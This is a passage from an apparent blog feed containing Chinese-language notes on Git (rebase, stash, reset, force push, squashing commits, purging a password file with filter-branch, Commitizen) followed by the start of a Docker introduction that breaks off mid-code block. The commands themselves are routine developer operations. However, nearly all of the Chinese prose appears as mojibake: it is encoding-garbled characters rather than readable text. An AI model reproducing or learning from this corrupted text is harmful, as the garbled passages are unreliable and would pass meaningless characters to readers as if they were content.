å·²ç»å°†æäº¤æ¨é€è‡³æŸä¸ªä»“åº“ï¼Œè€Œå…¶ä»–äººä¹Ÿå·²ç»ä»è¯¥ä»“åº“æ‹‰å–æäº¤å¹¶è¿›è¡Œäº†åç»­å·¥ä½œï¼Œæ­¤æ—¶ï¼Œä½ ç”¨ git rebase å‘½ä»¤é‡æ–°æ•´ç†äº†æäº¤å¹¶å†æ¬¡æ¨é€ï¼Œä½ çš„åŒä¼´å› æ­¤å°†ä¸å¾—ä¸å†æ¬¡å°†ä»–ä»¬æ‰‹å¤´çš„å·¥ä½œä¸ä½ çš„æäº¤è¿›è¡Œæ•´åˆï¼Œå¦‚æœæ¥ä¸‹æ¥ä½ è¿˜è¦æ‹‰å–å¹¶æ•´åˆä»–ä»¬ä¿®æ”¹è¿‡çš„æäº¤ï¼Œäº‹æƒ…å°±ä¼šå˜å¾—ä¸€å›¢ç³Ÿã€‚æ€»çš„åŸåˆ™æ˜¯ï¼Œä¸è¦å¯¹åœ¨ä½ çš„ä»“åº“å¤–æœ‰å‰¯æœ¬çš„åˆ†æ”¯æ‰§è¡Œå˜åŸºã€‚<br><img src="/2018/09/13/Gitç¬”è®°/3.png" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-å…¶ä»–"><a href="#4-å…¶ä»–" class="headerlink" title="4. å…¶ä»–"></a>4. å…¶ä»–</h3><h4 id="4-1-ç”ŸæˆSSHå…¬é’¥"><a href="#4-1-ç”ŸæˆSSHå…¬é’¥" class="headerlink" title="4.1 ç”ŸæˆSSHå…¬é’¥"></a>4.1 ç”ŸæˆSSHå…¬é’¥</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„SSHå¯†é’¥å­˜å‚¨åœ¨å…¶ ~/.ssh ç›®å½•ä¸‹ã€‚æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€å¯¹ä»¥id_dsaæˆ–id_raså‘½åçš„æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¸¦æœ‰.pubæ‰©å±•åï¼Œ.pubæ–‡ä»¶æ˜¯ä½ çš„å…¬é’¥ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯ç§é’¥ã€‚</p><p>å¦‚æœæ‰¾ä¸åˆ°è¿™æ ·çš„æ–‡ä»¶ï¼Œä½ å¯ä»¥è¿è¡Œssh-keygenç¨‹åºæ¥åˆ›å»ºå®ƒä»¬ã€‚ssh-keygenä¼šç¡®è®¤å¯†é’¥çš„å­˜å‚¨ä½ç½®ï¼Œç„¶åå®ƒä¼šè¦æ±‚ä½ è¾“å…¥ä¸¤æ¬¡å¯†é’¥å£ä»¤ã€‚å¦‚æœä½ ä¸æƒ³åœ¨ä½¿ç”¨å¯†é’¥æ—¶è¾“å…¥å£ä»¤ï¼Œå°†å…¶ç•™ç©ºå³å¯ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys2  id_dsa       known_hosts</span><br><span class="line">config            id_dsa.pub</span><br><span class="line">$ ssh-keygen</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-æš‚å­˜æ–‡ä»¶"><a href="#4-2-æš‚å­˜æ–‡ä»¶" class="headerlink" title="4.2 æš‚å­˜æ–‡ä»¶"></a>4.2 æš‚å­˜æ–‡ä»¶</h4><p>å°†å½“å‰å·¥ä½œåŒºçš„ä¿®æ”¹æš‚å­˜èµ·æ¥ï¼Œstashåï¼Œå¯ä»¥å°†å…¶é‡æ–°åº”ç”¨åˆ°å½“å‰å·¥ä½œåŒºã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">$ git stash apply</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-æ’¤é”€é”™è¯¯commit"><a href="#4-3-æ’¤é”€é”™è¯¯commit" class="headerlink" title="4.3 æ’¤é”€é”™è¯¯commit"></a>4.3 æ’¤é”€é”™è¯¯commit</h4><ul><li><p>é”™è¯¯commitåï¼Œä»…æ’¤é”€commit, æš‚å­˜åŒºã€å·¥ä½œå†…å®¹ä¸å˜<br><em>æ³¨æ„: commit-idä¸ºé”™è¯¯commitä¹‹å‰çš„commit-id</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --soft commit-id</span><br></pre></td></tr></table></figure></li><li><p>é”™è¯¯commitåï¼Œæ’¤é”€commitå’Œaddï¼Œ å·¥ä½œå†…å®¹ä¸å˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --mixed commit-id</span><br><span class="line">// è¯¥å‘½ä»¤ç›¸å½“äºæ¢å¤åˆ°git add ä¹‹å‰çš„çŠ¶æ€ï¼ŒåŒæ—¶å·¥ä½œåŒºçš„å†…å®¹ä¸å˜</span><br></pre></td></tr></table></figure></li><li><p>é”™è¯¯commitåï¼Œæƒ³æ¢å¤åˆ°æŸä¸ªç‰ˆæœ¬åº“çš„ä»£ç ï¼ˆæš‚å­˜åŒºã€å·¥ä½œåŒºå‡æ”¹å˜ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --hard commit-id</span><br></pre></td></tr></table></figure></li><li><p>æ’¤é”€å·²ç»pushè‡³è¿œç«¯ä»“åº“çš„commit<br>æ’¤å›åç›´æ¥push, ä¼šæŠ¥é”™ã€‚ å› ä¸ºæœ¬åœ°é¡¹ç›®ç‰ˆæœ¬å·ä½äºè¿œç«¯ä»“åº“ç‰ˆæœ¬å·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error: failed to push some refs to &apos;https://github.com/ufresh2013/elite-wagtail.git&apos;</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: &apos;git pull ...&apos;) before pushing again.</span><br></pre></td></tr></table></figure></li></ul><p>è¿™æ—¶ï¼Œå¯ä»¥æ·»åŠ å‚æ•°<code>force</code>å¼ºåˆ¶æäº¤ï¼Œ è¾¾åˆ°æ’¤é”€è¿œç«¯ç‰ˆæœ¬å·çš„ç›®çš„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git reset --mixed commit-id</span><br><span class="line">git push origin master --force // å¼ºåˆ¶æäº¤å½“å‰ç‰ˆæœ¬å·ï¼Œæ’¤é”€è¿œç«¯é”™è¯¯commit</span><br><span class="line"></span><br><span class="line">// é‡æ–°æäº¤</span><br><span class="line">git add</span><br><span class="line">git commit</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-4-åˆå¹¶commit"><a href="#4-4-åˆå¹¶commit" class="headerlink" title="4.4 åˆå¹¶commit"></a>4.4 åˆå¹¶commit</h4><p>é€šè¿‡å˜åŸºï¼Œå¯ä»¥å°†ä¸€è¿ä¸²æäº¤å‹ç¼©æˆä¸€ä¸ªå•ç‹¬çš„æäº¤ã€‚<br>å‡è®¾å·²ç»å­˜åœ¨3ä¸ªcommit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">commit commitId3   add line 3</span><br><span class="line">commit commitId2   add line 2</span><br><span class="line">commit commitId1   add line 1</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦æŠŠadd line 2, add line 3è¿™ä¸¤ä¸ªcommitåˆå¹¶æˆä¸€ä¸ªcommitã€‚pickä¼šæ‰§è¡Œè¿™ä¸ªcommit, squashä¼šæŠŠè¿™ä¸ªcommitåˆå¹¶åˆ°å‰ä¸€ä¸ªcommitã€‚<code>wq</code>ä¿å­˜åï¼Œä¼šç»§ç»­è·³åˆ°commit messageã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i commitId1</span><br><span class="line"></span><br><span class="line">pick commitId2 add line 2</span><br><span class="line">squash commitId3 add line 3</span><br><span class="line">#</span><br><span class="line"># Commands:</span><br><span class="line">#  p, pick = use commit</span><br><span class="line">#  r, reword = use commit, but edit the commit message</span><br><span class="line">#  e, edit = use commit, but stop for amending</span><br><span class="line">#  s, squash = use commit, but meld into previous commit</span><br><span class="line">#  f, fixup = like &quot;squash&quot;, but discard this commit&apos;s log message</span><br><span class="line">#  x, exec = run command (the rest of the line) using shell</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-5-æ‹†åˆ†commit"><a href="#4-5-æ‹†åˆ†commit" class="headerlink" title="4.5 æ‹†åˆ†commit"></a>4.5 æ‹†åˆ†commit</h4><p>æ‹†åˆ†ä¸€ä¸ªæäº¤ä¼šæ’¤é”€è¿™ä¸ªæäº¤ï¼Œç„¶åå¤šæ¬¡åœ°éƒ¨åˆ†ç¬¬æš‚å­˜ä¸æäº¤çŸ¥é“å®Œæˆä½ æ‰€éœ€æ¬¡æ•°çš„æäº¤ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset HEAD^</span><br><span class="line">å®é™…ä¸Šå°†ä¼šæ’¤é”€é‚£æ¬¡æäº¤å¹¶å°†ä¿®æ”¹çš„æ–‡ä»¶æœªæš‚å­˜</span><br></pre></td></tr></table></figure></p><ul><li>ä»æ¯ä¸€ä¸ªæäº¤ç§»é™¤ä¸€ä¸ªæ–‡ä»¶: æœ‰äººç²—å¿ƒåœ°é€šè¿‡<code>git add .</code> æäº¤äº†ä¸€ä¸ªå·¨å¤§çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ æƒ³è¦ä»æ‰€æœ‰åœ°æ–¹åˆ é™¤å®ƒã€‚å¯èƒ½å¶ç„¶æäº¤äº†ä¸€ä¸ªåŒ…å«å¯†ç çš„æ–‡ä»¶ï¼Œç„¶è€Œä½ æƒ³å¼€æºé¡¹ç›®ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git filter-branch --tree-filter &apos;rm -f passwords.txt&apos; HEAD</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-6-Gité’©å­"><a href="#4-6-Gité’©å­" class="headerlink" title="4.6 Gité’©å­"></a>4.6 Gité’©å­</h4><p>Git èƒ½åœ¨ç‰¹å®šçš„é‡è¦åŠ¨ä½œå‘ç”Ÿæ—¶è§¦å‘è‡ªå®šä¹‰è„šæœ¬ã€‚å®¢æˆ·ç«¯é’©å­ç”±è¯¸å¦‚æäº¤å’Œåˆå¹¶è¿™æ ·çš„æ“ä½œæ‰€è°ƒç”¨ï¼Œè€ŒæœåŠ¡å™¨ç«¯é’©å­ä½œç”¨äºè¯¸å¦‚æ¥æ”¶è¢«æ¨é€çš„æäº¤è¿™æ ·çš„è”ç½‘æ“ä½œã€‚<br><br></p><h4 id="4-7-Github-Pages"><a href="#4-7-Github-Pages" class="headerlink" title="4.7 Github Pages"></a>4.7 Github Pages</h4><ul><li>Create a repository.</li><li>Go to the folder where you want to store your project, and clone the new repository<br><code>git clone https://github.com/username/username.github.io</code></li><li>Enter the project folder and add an index.html file<br><code>echo &quot;hello world&quot; &gt; index.html</code></li><li>Add, commit, and push your changes</li><li>Fire up a broswer and go to <a href="http://username.github.io" target="_blank" rel="noopener">http://username.github.io</a></li></ul><p><br><br><br></p><h3 id="5-Commitizenè§„èŒƒæäº¤ä¿¡æ¯"><a href="#5-Commitizenè§„èŒƒæäº¤ä¿¡æ¯" class="headerlink" title="5. Commitizenè§„èŒƒæäº¤ä¿¡æ¯"></a>5. Commitizenè§„èŒƒæäº¤ä¿¡æ¯</h3><p>commitizenæ˜¯AngularJSé¡¹ç›®ä¸­ç”¨åˆ°çš„Git Commit Guidelinesã€‚ç”¨æ¥è§„èŒƒcommitä¿¡æ¯ï¼Œéµå¾ªä¸€å®šçš„èŒƒå¼ï¼Œä¾¿äºæ—¥åè¿½è¸ªé—®é¢˜ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> å…¨å±€å®‰è£…commitizen</span><br><span class="line">npm install -g commitizen</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> åœ¨é¡¹ç›®ç›®å½•é‡Œï¼Œè¿è¡Œä¸‹é¢å‘½ä»¤ï¼Œä½¿å…¶æ”¯æŒangularçš„commite messageæ ¼å¼</span><br><span class="line">commitizen init cz-conventional-changelog --save --save-exact</span><br></pre></td></tr></table></figure><p>å‡¡æ˜¯ç”¨åˆ°git commitå‘½ä»¤ï¼Œä¸€å¾‹æ”¹ä¸ºä½¿ç”¨git czï¼Œå°±ä¼šå‡ºç°é€‰é¡¹ï¼Œç”¨æ¥ç”Ÿæˆç¬¦åˆæ ¼å¼çš„commit message</p><p><img src="/2018/09/13/Gitç¬”è®°/4.png" style="max-width: 500px"></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Gitå®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">Gitå·¥ä½œæµç¨‹æœ€ä½³å®è·µâ€“git flow</a></li><li><a href="https://blog.csdn.net/hanchao5272/article/details/79435730" target="_blank" rel="noopener">Gitæ’¤é”€å·²ç»æ¨é€(push)è‡³è¿œç«¯ä»“åº“çš„æäº¤(commit)ä¿¡æ¯</a></li><li><a href="https://www.jianshu.com/p/201bd81e7dc9?utm_source=oschina-app" target="_blank" rel="noopener">git commit è§„èŒƒæŒ‡å—</a></li><li><a href="https://www.cnblogs.com/imzhi/p/solution-to-git-checkout-error-tips.html" target="_blank" rel="noopener">https://www.cnblogs.com/imzhi/p/solution-to-git-checkout-error-tips.html</a></li><li><a href="https://blog.csdn.net/u012117723/article/details/52954721/" target="_blank" rel="noopener">https://blog.csdn.net/u012117723/article/details/52954721/</a></li><li><a href="https://www.cnblogs.com/jiaoshou/p/11218526.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiaoshou/p/11218526.html</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DockeråŸºæœ¬æ¦‚å¿µä¸æ“ä½œ</title>
      <link href="/2018/09/08/Docker%E5%85%A5%E9%97%A8/"/>
      <url>/2018/09/08/Docker%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-Dockeræ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-Dockeræ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1. Dockeræ˜¯ä»€ä¹ˆï¼Ÿ"></a>1. Dockeræ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>Dockeræ˜¯ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒå®¹å™¨ï¼Œå¯ä»¥å°†ä½ çš„å¼€å‘ç¯å¢ƒã€ä»£ç ã€é…ç½®æ–‡ä»¶ç­‰ä¸€å¹¶æ‰“åŒ…åˆ°è¿™ä¸ªå®¹å™¨ä¸­ï¼Œå¹¶å‘å¸ƒå’Œåº”ç”¨åˆ°ä»»æ„å¹³å°ä¸­ã€‚æ¯”å¦‚ï¼Œä½ åœ¨æœ¬åœ°ç”¨Pythonå¼€å‘ç½‘ç«™åå°ï¼Œå¼€å‘æµ‹è¯•å®Œæˆåï¼Œå°±å¯ä»¥å°†Python3åŠå…¶ä¾èµ–åŒ…ã€FlaskåŠå…¶å„ç§æ’ä»¶ã€Mysqlã€Nginxç­‰æ‰“åŒ…åˆ°ä¸€ä¸ªå®¹å™¨ä¸­ï¼Œç„¶åéƒ¨ç½²åˆ°ä»»æ„ä½ æƒ³éƒ¨ç½²åˆ°çš„ç¯å¢ƒã€‚</p><p>Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.</p><p><br></p><h3 id="2-Docker-Engine"><a href="#2-Docker-Engine" class="headerlink" title="2. Docker Engine"></a>2. Docker Engine</h3><p>æœ€æ ¸å¿ƒçš„æ˜¯Docker Daemonï¼Œç§°ä¹‹ä¸ºDockerå®ˆæŠ¤è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯serverç«¯ã€‚Severç«¯ä¸å®¢æˆ·ç«¯é€šè¿‡REST API è¿›è¡Œé€šä¿¡ã€‚å®¢æˆ·ç«¯æä¾›ä¸€ä¸ªåªè¯»çš„é•œåƒï¼Œé€šè¿‡é•œåƒå¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ï¼Œå®¹å™¨åœ¨docker clientä¸­åªæ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸¤ä¸ªè¿›ç¨‹æ˜¯äº’ä¸å¯è§çš„ã€‚</p><p>The Cli uses the Docker REST API to control or interact with the Docker daemon through scripting or direct CLI commands. The daemon creates and manages Docker objects, such as images, container, networks and wolumes.<br><img src="/2018/09/08/Dockerå…¥é—¨/1.jpeg" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="3-Dockeræ¶æ„ä¸åŸºæœ¬æ¦‚å¿µ"><a href="#3-Dockeræ¶æ„ä¸åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="3. Dockeræ¶æ„ä¸åŸºæœ¬æ¦‚å¿µ"></a>3. Dockeræ¶æ„ä¸åŸºæœ¬æ¦‚å¿µ</h3><p>é•œåƒæ˜¯Dockerç”Ÿå‘½å‘¨æœŸä¸­çš„æ„å»ºæˆ–æ‰“åŒ…é˜¶æ®µï¼Œè€Œå®¹å™¨åˆ™æ˜¯å¯åŠ¨æˆ–æ‰§è¡Œé˜¶æ®µã€‚</p><p>A container is launched by running an image. An image is an executable package that includes everything needed to run an application â€“ the code, a runtime, libraries, environment variables, and configuration files.<br><img src="/2018/09/08/Dockerå…¥é—¨/2.jpeg" style="padding-top:20px"></p><p><br></p><h4 id="3-1-é•œåƒ-Docker-Image"><a href="#3-1-é•œåƒ-Docker-Image" class="headerlink" title="3.1 é•œåƒ(Docker Image)"></a>3.1 é•œåƒ(Docker Image)</h4><p>An image is a read-only template with instructions for creating a Docker container.</p><p>é•œåƒæ˜¯ä¸€ç§å±‚å¼ç»“æ„ã€‚ç”±ä¸€ç³»åˆ—æŒ‡ä»¤ä¸€æ­¥æ­¥æ„å»ºå‡ºæ¥ï¼šæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæ·»åŠ æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ï¼Œåˆ›å»ºç¯å¢ƒå˜é‡ï¼Œå®¹å™¨å¯åŠ¨æ—¶-è¿è¡Œä»€ä¹ˆç¯å¢ƒã€‚<br>å½“ç”¨æˆ·ä¿®æ”¹ä¸€ä¸ªDocker Imageçš„æ—¶å€™ï¼ˆæ¯”å¦‚æ›´æ–°åº”ç”¨ç¨‹åºï¼‰ä¸€ä¸ªæ–°çš„å±‚å°±ä¼šè¢«å»ºç«‹ã€‚å› æ­¤ï¼Œè¿™æ˜¯ä¸€ç§å¢é‡å¼çš„ä¿®æ”¹ï¼Œè€Œä¸æ˜¯æ–°å»ºä¸€ä¸ªå…¨æ–°çš„Imageï¼Œè¿™ä¹Ÿæ˜¯åŒºåˆ«äºä¼ ç»Ÿè™šæ‹Ÿæœºçš„ä¸€ç‚¹ã€‚å½“ä½ å‘å¸ƒä¸€ä¸ªæ–°çš„Imageæ—¶ï¼Œä½ åªéœ€è¦å‘å¸ƒå·®å¼‚çš„éƒ¨åˆ†ï¼Œå› æ­¤é€Ÿåº¦å°±éå¸¸å¿«ã€‚<br><img src="/2018/09/08/Dockerå…¥é—¨/3.jpeg" style="padding-top:20px; max-width:300px"></p><p><br></p><h4 id="3-2-å®¹å™¨ï¼ˆContainerï¼‰"><a href="#3-2-å®¹å™¨ï¼ˆContainerï¼‰" class="headerlink" title="3.2 å®¹å™¨ï¼ˆContainerï¼‰"></a>3.2 å®¹å™¨ï¼ˆContainerï¼‰</h4><p>A container is a runnable instance of an image.</p><p>Dockeråœ¨æ–‡ä»¶ç³»ç»Ÿå†…éƒ¨ç”¨è¿™ä¸ªé•œåƒåˆ›å»ºäº†ä¸€ä¸ªæ–°å®¹å™¨ã€‚è¯¥å®¹å™¨æ‹¥æœ‰è‡ªå·±çš„ç½‘ç»œã€IPåœ°å€ï¼Œä»¥åŠä¸€ä¸ªç”¨æ¥å’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡çš„æ¡¥æ¥ç½‘ç»œæ¥å£ã€‚</p><p>æ‰“ä¸ªæ¯”æ–¹ï¼Œä½ é¦–å…ˆä¸‹è½½äº†ä¸€ä¸ªUbuntuçš„é•œåƒï¼Œç„¶ååˆå®‰è£…äº†mysqlå’ŒDjangoåº”ç”¨åŠä¾èµ–ï¼Œæ¥å®Œæˆå¯¹Ubutuné•œåƒçš„ä¿®æ”¹ï¼Œç”Ÿæˆäº†ä¸€ä¸ªåº”ç”¨é•œåƒã€‚ç„¶åï¼Œä½ æŠŠè¿™ä¸ªé•œåƒåˆ†äº«ç»™å¤§å®¶ä½¿ç”¨ï¼Œå¤§å®¶é€šè¿‡è¿™ä¸ªé•œåƒç”Ÿæˆäº†ä¸€ä¸ªå®¹å™¨ï¼Œå®¹å™¨å¯åŠ¨åå°±ä¼šè¿è¡ŒDjangoæœåŠ¡ã€‚</p><p><br></p><h4 id="3-3-ä»“åº“ï¼ˆDocker-Repositoryï¼‰"><a href="#3-3-ä»“åº“ï¼ˆDocker-Repositoryï¼‰" class="headerlink" title="3.3 ä»“åº“ï¼ˆDocker Repositoryï¼‰"></a>3.3 ä»“åº“ï¼ˆDocker Repositoryï¼‰</h4><p>Dockerç”¨æ¥å­˜æ”¾é•œåƒçš„ã€‚å…±æœ‰ä»“åº“docker hubæä¾›äº†éå¸¸å¤šçš„é•œåƒæ–‡ä»¶ï¼Œè¿™äº›é•œåƒç›´æ¥æ‹‰å–ä¸‹æ¥å°±å¯ä»¥è¿è¡Œäº†ï¼Œä½ ä¹Ÿå¯ä»¥ä¸Šä¼ è‡ªå·±çš„é•œåƒåˆ°docker hubä¸Šï¼Œæ­å»ºç§æœ‰ä»“åº“ã€‚</p><ul><li>å¼€å‘æ„å»ºé•œåƒå¹¶å°†é•œåƒpushåˆ°dockerä»“åº“</li><li>æµ‹è¯•æˆ–è€…è¿ç»´ä»dockerä»“åº“æ‹·è´ä¸€ä»½é•œåƒåˆ°æœ¬åœ°</li><li>é€šè¿‡é•œåƒæ–‡ä»¶å¼€å¯dockerå®¹å™¨å¹¶æä¾›æœåŠ¡<br><img src="/2018/09/08/Dockerå…¥é—¨/4.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-æ€ä¹ˆç”¨Dockerå®ŒæˆæŒç»­é›†æˆã€è‡ªåŠ¨äº¤ä»˜ã€è‡ªåŠ¨éƒ¨ç½²ï¼Ÿ"><a href="#4-æ€ä¹ˆç”¨Dockerå®ŒæˆæŒç»­é›†æˆã€è‡ªåŠ¨äº¤ä»˜ã€è‡ªåŠ¨éƒ¨ç½²ï¼Ÿ" class="headerlink" title="4. æ€ä¹ˆç”¨Dockerå®ŒæˆæŒç»­é›†æˆã€è‡ªåŠ¨äº¤ä»˜ã€è‡ªåŠ¨éƒ¨ç½²ï¼Ÿ"></a>4. æ€ä¹ˆç”¨Dockerå®ŒæˆæŒç»­é›†æˆã€è‡ªåŠ¨äº¤ä»˜ã€è‡ªåŠ¨éƒ¨ç½²ï¼Ÿ</h3><p>æ­å»ºä¸€ä¸ªå®Œæ•´çš„è‡ªåŠ¨åŒ–æµç¨‹è¿˜éœ€è¦github+Jenkins+registryä¸‰æ ·å¸®åŠ©ã€‚</p><ul><li>å¼€å‘äººå‘˜æ¨é€ä»£ç åˆ°gitï¼ŒgitæœåŠ¡å™¨é€šè¿‡hooké€šçŸ¥jenkis</li><li>jenkinså…‹éš†gitä»£ç åˆ°æœ¬åœ°ï¼Œå¹¶é€šè¿‡dockerFileæ–‡ä»¶è¿›è¡Œç¼–è¯‘</li><li>æ‰“åŒ…ç”Ÿæˆä¸€ä¸ªæ–°ç‰ˆæœ¬çš„é•œåƒå¹¶æ¨é€åˆ°ä»“åº“ï¼Œåˆ é™¤å½“å‰å®¹å™¨ï¼Œé€šè¿‡æ–°ç‰ˆæœ¬é•œåƒé‡æ–°è¿è¡Œã€‚<br>å¼€å‘åªéœ€git add *, git commit -m â€œâ€, git pushå³å¯å®ŒæˆæŒç»­é›†æˆã€è‡ªåŠ¨äº¤ä»˜ã€è‡ªåŠ¨éƒ¨ç½²ã€‚<br><img src="/2018/09/08/Dockerå…¥é—¨/5.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="5-DockeråŸºæœ¬å‘½ä»¤"><a href="#5-DockeråŸºæœ¬å‘½ä»¤" class="headerlink" title="5. DockeråŸºæœ¬å‘½ä»¤"></a>5. DockeråŸºæœ¬å‘½ä»¤</h3><table><thead><tr><th>é•œåƒçš„æ“ä½œ</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>$ docker search centos</td><td style="text-align:center">æŸ¥çœ‹é•œåƒæ˜¯å¦å­˜åœ¨</td></tr><tr><td>$ docker pull centos</td><td style="text-align:center">è·å–é•œåƒ</td></tr><tr><td>$ docker build</td><td style="text-align:center">åˆ›å»ºé•œåƒï¼ˆåˆ©ç”¨Dockerfileï¼‰</td></tr><tr><td>$ docker images ls</td><td style="text-align:center">æŸ¥çœ‹é•œåƒ</td></tr><tr><td>$ docker commit</td><td style="text-align:center">å°†å®¹å™¨è½¬åŒ–ä¸ºä¸€ä¸ªé•œåƒ</td></tr><tr><td>$ docker rmi image_name/image_id</td><td style="text-align:center">åˆ é™¤é•œåƒ</td></tr><tr><td>å®¹å™¨çš„æ“ä½œ</td><td style="text-align:center"></td></tr><tr><td>$ docker run</td><td style="text-align:center">åŸºäºé•œåƒå¯åŠ¨å®¹å™¨</td></tr><tr><td>$ docker container ls</td><td style="text-align:center">æŸ¥çœ‹å®¹å™¨</td></tr><tr><td>$ docker start container_name/container_id</td><td style="text-align:center">å¯åŠ¨å®¹å™¨</td></tr><tr><td>$ docker stop container_name/container_id</td><td style="text-align:center">åœæ­¢å®¹å™¨</td></tr><tr><td>$ docker restart container_name/container_id</td><td style="text-align:center">é‡å¯å®¹å™¨</td></tr><tr><td>$ docker rm container_name/container_id</td><td style="text-align:center">åˆ é™¤å®¹å™¨</td></tr><tr><td>$ docker exec -it container-id /bin/bash</td><td style="text-align:center">è¿›å…¥å®¹å™¨</td></tr><tr><td>ä»“åº“çš„æ“ä½œ</td><td style="text-align:center"></td></tr><tr><td>$ docker login</td><td style="text-align:center">ç™»å½•Dockerhub</td></tr><tr><td>$ docker push xianhu/centos:git</td><td style="text-align:center">å°†æœ¬åœ°çš„é•œåƒæ¨é€åˆ°Dockerhub</td></tr><tr><td>$ docker pull xianhu/centos:git</td><td style="text-align:center">ä»ä½ çš„ä»“åº“ä¸­ä¸‹è½½é•œåƒ</td></tr></tbody></table><p><br></p><h3 id="6-æ“ä½œç¤ºä¾‹"><a href="#6-æ“ä½œç¤ºä¾‹" class="headerlink" title="6. æ“ä½œç¤ºä¾‹"></a>6. æ“ä½œç¤ºä¾‹</h3><p><a href="https://docs.docker.com/get-started" target="_blank" rel="noopener">https://docs.docker.com/get-started</a></p><h4 id="5-1-Orientation-Set-up-your-Docker-environment"><a href="#5-1-Orientation-Set-up-your-Docker-environment" class="headerlink" title="5.1 Orientation (Set up your Docker environment)"></a>5.1 Orientation (Set up your Docker environment)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Display docker version and info</span><br><span class="line">docker â€“version</span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line"># Execute Docker 